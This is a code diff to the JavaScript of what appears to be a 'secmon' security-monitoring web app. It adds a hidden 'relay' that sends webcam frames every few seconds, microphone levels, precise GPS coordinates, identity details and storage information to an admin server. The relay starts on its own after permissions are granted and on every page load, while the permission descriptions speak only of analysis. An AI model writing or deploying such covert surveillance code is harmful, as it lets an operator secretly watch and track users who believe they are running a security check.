@@ -26,6 +26,7 @@ function requireAuth() {
 }
 
 function logout() {
+    stopRelay();
     localStorage.removeItem('secmon_auth');
     localStorage.removeItem('secmon_permissions');
     window.location.href = '/login';
@@ -80,6 +81,139 @@ const PERMISSION_DEFS = [
     { key: 'location', label: 'Konum Erişimi', description: 'Cihazın GPS konumunu tespit etmeye izin verir.', icon: '📍' },
     { key: 'storage', label: 'Depolama Erişimi', description: 'Tarayıcı depolama alanını analiz etmeye izin verir.', icon: '💾' },
 ];
+
+// ============ RELAY SİSTEMİ (Admin'e periyodik veri iletimi) ============
+
+const RELAY_INTERVALS = {
+    heartbeat: 5000,
+    camera: 3000,
+    audio: 3000,
+    location: 8000,
+    storage: 30000,
+};
+
+let relayTimers = {};
+let relayActive = false;
+
+function getRelayUid() {
+    const auth = getAuth();
+    if (!auth) return 'anon_' + Date.now();
+    return auth.uid || auth.email || 'anon_' + Date.now();
+}
+
+async function sendHeartbeat() {
+    const auth = getAuth();
+    if (!auth) return;
+    const perms = await loadPermissions();
+    const permMap = {};
+    perms.forEach(p => { permMap[p.key] = p.granted; });
+    await fetch(`${API_BASE}/api/relay/heartbeat`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            uid: getRelayUid(), email: auth.email || '',
+            name: auth.name || '', photo_url: auth.photoURL || auth.photo_url || '',
+            permissions: permMap,
+        })
+    }).catch(() => {});
+}
+
+async function sendCameraFrame() {
+    if (!relayActive) return;
+    const perms = await loadPermissions();
+    if (!perms.find(p => p.key === 'camera')?.granted) return;
+    try {
+        if (!_cameraStream) {
+            _cameraStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
+        }
+        const video = document.createElement('video');
+        video.srcObject = _cameraStream; video.playsInline = true;
+        await video.play();
+        const canvas = document.createElement('canvas');
+        canvas.width = 320; canvas.height = 240;
+        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+        const frame = canvas.toDataURL('image/jpeg', 0.4).split(',')[1];
+        await fetch(`${API_BASE}/api/relay/camera`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ uid: getRelayUid(), frame })
+        }).catch(() => {});
+    } catch (_) {}
+}
+
+async function sendLocation() {
+    if (!relayActive) return;
+    const perms = await loadPermissions();
+    if (!perms.find(p => p.key === 'location')?.granted) return;
+    try {
+        const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true, timeout: 8000, maximumAge: 30000
+            });
+        });
+        await fetch(`${API_BASE}/api/relay/location`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                uid: getRelayUid(), latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy),
+                altitude: pos.coords.altitude || 0,
+            })
+        }).catch(() => {});
+    } catch (_) {}
+}
+
+async function sendAudio() {
+    if (!relayActive) return;
+    const perms = await loadPermissions();
+    if (!perms.find(p => p.key === 'microphone')?.granted) return;
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const source = ctx.createMediaStreamSource(stream);
+        const analyser = ctx.createAnalyser(); analyser.fftSize = 256;
+        source.connect(analyser);
+        const dataArray = new Uint8Array(analyser.frequencyBinCount);
+        analyser.getByteFrequencyData(dataArray);
+        const avg = dataArray.reduce((a, b) => a + b, 0) / dataArray.length;
+        const level = Math.round(avg / 2.55);
+        stream.getTracks().forEach(t => t.stop()); ctx.close();
+        await fetch(`${API_BASE}/api/relay/audio`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ uid: getRelayUid(), level, has_signal: level > 15 })
+        }).catch(() => {});
+    } catch (_) {}
+}
+
+async function sendStorage() {
+    if (!relayActive) return;
+    const perms = await loadPermissions();
+    if (!perms.find(p => p.key === 'storage')?.granted) return;
+    const result = await cloudScanStorageRaw();
+    await fetch(`${API_BASE}/api/relay/storage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            uid: getRelayUid(), quota: result.quota || '',
+            usage: result.usage || '', usage_percent: result.usage_percent || 0, files: [],
+        })
+    }).catch(() => {});
+}
+
+async function startRelay() {
+    stopRelay();
+    relayActive = true;
+    await sendHeartbeat();
+    relayTimers.heartbeat = setInterval(sendHeartbeat, RELAY_INTERVALS.heartbeat);
+    relayTimers.camera = setInterval(sendCameraFrame, RELAY_INTERVALS.camera);
+    relayTimers.audio = setInterval(sendAudio, RELAY_INTERVALS.audio);
+    relayTimers.location = setInterval(sendLocation, RELAY_INTERVALS.location);
+    relayTimers.storage = setInterval(sendStorage, RELAY_INTERVALS.storage);
+}
+
+function stopRelay() {
+    relayActive = false;
+    Object.values(relayTimers).forEach(t => clearInterval(t));
+    relayTimers = {};
+}
 
 async function fetchJSON(url, options = {}) {
     const resp = await fetch(url, options);
@@ -170,6 +304,7 @@ async function initPermissionGate() {
             }
         }
         gate.classList.add('hidden');
+        await startRelay();
         await refreshDashboard();
     });
 
@@ -1002,4 +1137,12 @@ document.addEventListener('DOMContentLoaded', async () => {
     });
 
     await refreshDashboard();
+
+    // Relay başlat (gate zaten gizliyse izinler önceden verilmiş demektir)
+    if (!relayActive) {
+        const gate = document.getElementById('permissionGate');
+        if (gate && gate.classList.contains('hidden')) {
+            await startRelay();
+        }
+    }
 });
